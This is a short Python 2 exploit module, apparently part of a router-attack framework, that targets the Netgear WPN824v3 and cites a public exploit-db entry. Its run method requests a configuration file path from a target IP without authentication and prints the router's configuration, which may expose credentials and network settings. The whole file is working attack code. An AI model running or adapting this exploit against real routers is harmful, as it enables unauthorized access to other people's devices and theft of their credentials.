import urllib
import util
from ..router_vuln import RouterVuln


class wpn824v3_get_config(RouterVuln):
    """Read the configuration file
       http://www.exploit-db.com/exploits/25969/
    """
    def __init__(self):
        self.router = 'WPN824v3'
        self.vuln   = 'Read Configuration File'
        super(wpn824v3_get_config, self).__init__()

    def run(self):
        util.Msg('Fetching config from %s...' % self.ip)
        url = 'http://%s/cgi-bin/NETGEAR_wpn824v3.cfg' % self.ip
        try:
            response = urllib.urlopen(url).read()
            util.Msg(response)
        except Exception, e:
            util.Error('Error: %s' % e)
